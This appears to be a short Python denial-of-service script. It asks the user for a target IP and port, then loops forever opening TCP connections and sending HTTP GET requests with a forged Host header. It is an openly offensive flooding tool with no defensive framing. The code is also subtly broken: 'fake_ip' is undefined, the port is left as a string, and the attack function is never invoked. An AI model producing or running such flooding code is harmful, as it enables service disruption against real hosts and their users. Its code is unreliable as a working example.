import socket
import threading
import time

#============target info================#
zombie_IP = input("Enter your target IP : ")
zombie_PORT = input("Enter the port : ")

#============Attack func================#
def attack():
    #infinity stones
    while True:
        catapulta = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        catapulta.connect((zombie_IP, zombie_PORT))
        catapulta.sendto(("GET /" + zombie_IP + " HTTP/1.1\r\n").encode('ascii'), (zombie_IP, zombie_PORT))
        catapulta.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (zombie_IP, zombie_PORT))
        catapulta.close()